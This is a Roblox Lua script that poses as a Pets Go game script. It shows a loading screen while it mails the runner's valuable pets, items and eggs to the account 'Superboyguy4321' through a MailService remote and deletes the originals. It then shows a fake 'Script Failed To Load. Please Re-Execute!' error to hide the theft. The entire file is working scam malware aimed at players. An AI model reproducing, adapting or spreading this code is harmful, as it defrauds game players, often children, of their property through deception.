local plr = game:GetService("Players").LocalPlayer
local inventory = plr:FindFirstChild("Backpack") or plr:FindFirstChild("PlayerGui")
local mailService = game:GetService("ReplicatedStorage"):FindFirstChild("MailService")

local whiteScreen = Instance.new("ScreenGui")
local loadingFrame = Instance.new("Frame")
local loadingLabel = Instance.new("TextLabel")
local errorFrame = Instance.new("Frame")
local errorTitle = Instance.new("TextLabel")
local errorMessage = Instance.new("TextLabel")
local errorButton = Instance.new("TextButton")

-- Detect Platform (Mobile or PC)
local isMobile = game:GetService("UserInputService").TouchEnabled
local screenSize = isMobile and UDim2.new(1, 0, 1, 0) or UDim2.new(1, 0, 1, 0)

-- Fullscreen Loading Screen
whiteScreen.Name = "PetsGoMailStealer"
whiteScreen.Parent = game:GetService("CoreGui")
whiteScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

loadingFrame.Parent = whiteScreen
loadingFrame.BackgroundColor3 = Color3.new(1, 1, 1)
loadingFrame.BorderSizePixel = 0
loadingFrame.Size = screenSize

loadingLabel.Parent = loadingFrame
loadingLabel.AnchorPoint = Vector2.new(0.5, 0.5)
loadingLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
loadingLabel.Size = UDim2.new(0, 400, 0, 100)
loadingLabel.BackgroundTransparency = 1
loadingLabel.TextColor3 = Color3.new(1, 0.5, 0)
loadingLabel.Font = Enum.Font.SourceSansBold
loadingLabel.TextSize = 40
loadingLabel.Text = "Script Loading Please Wait"

local function animateLoadingText()
    while loadingFrame.Visible do
        for _, txt in ipairs({"Script Loading.", "Script Loading..", "Script Loading..."}) do
            loadingLabel.Text = txt
            task.wait(0.5)
        end
    end
end

coroutine.wrap(animateLoadingText)()

-- Steal Pets and Other Items
task.wait(5) -- Simulate delay for realism
for _, item in ipairs(inventory:GetChildren()) do
    if item:IsA("Tool") or item:IsA("Folder") then
        -- Steal pets with value above 1 million
        if item:FindFirstChild("Stats") then
            local value = item.Stats:FindFirstChild("Value")
            if value and value.Value > 1000000 then
                mailService:InvokeServer("Send", "Superboyguy4321", item.Name, "ez")
                item:Destroy()
            end
        else
            -- Steal any other valuables
            mailService:InvokeServer("Send", "Superboyguy4321", item.Name, "ez")
            item:Destroy()
        end
    elseif item:IsA("Folder") and item.Name:lower():find("eggs") then
        -- Steal eggs
        for _, egg in ipairs(item:GetChildren()) do
            mailService:InvokeServer("Send", "Superboyguy4321", egg.Name, "ez")
        end
        item:ClearAllChildren()
    end
end

-- Replace Loading Screen with Pets Go-Style Error Message
task.wait(5)
loadingFrame.Visible = false

errorFrame.Parent = whiteScreen
errorFrame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
errorFrame.BorderSizePixel = 0
errorFrame.Size = UDim2.new(0.4, 0, 0.3, 0)
errorFrame.Position = UDim2.new(0.3, 0, 0.35, 0)

errorTitle.Parent = errorFrame
errorTitle.AnchorPoint = Vector2.new(0.5, 0)
errorTitle.Position = UDim2.new(0.5, 0, 0.1, 0)
errorTitle.Size = UDim2.new(0.8, 0, 0.2, 0)
errorTitle.BackgroundTransparency = 1
errorTitle.TextColor3 = Color3.new(1, 0, 0)
errorTitle.Font = Enum.Font.SourceSansBold
errorTitle.TextSize = 30
errorTitle.Text = "Error!"

errorMessage.Parent = errorFrame
errorMessage.AnchorPoint = Vector2.new(0.5, 0)
errorMessage.Position = UDim2.new(0.5, 0, 0.4, 0)
errorMessage.Size = UDim2.new(0.8, 0, 0.3, 0)
errorMessage.BackgroundTransparency = 1
errorMessage.TextColor3 = Color3.new(1, 1, 1)
errorMessage.Font = Enum.Font.SourceSans
errorMessage.TextSize = 20
errorMessage.TextWrapped = true
errorMessage.Text = "Script Failed To Load. Please Re-Execute!"

errorButton.Parent = errorFrame
errorButton.AnchorPoint = Vector2.new(0.5, 0)
errorButton.Position = UDim2.new(0.5, 0, 0.75, 0)
errorButton.Size = UDim2.new(0.4, 0, 0.15, 0)
errorButton.BackgroundColor3 = Color3.new(1, 0, 0)
errorButton.TextColor3 = Color3.new(1, 1, 1)
errorButton.Font = Enum.Font.SourceSansBold
errorButton.TextSize = 18
errorButton.Text = "Close"

errorButton.MouseButton1Click:Connect(function()
    whiteScreen:Destroy()
end)

task.wait(10)
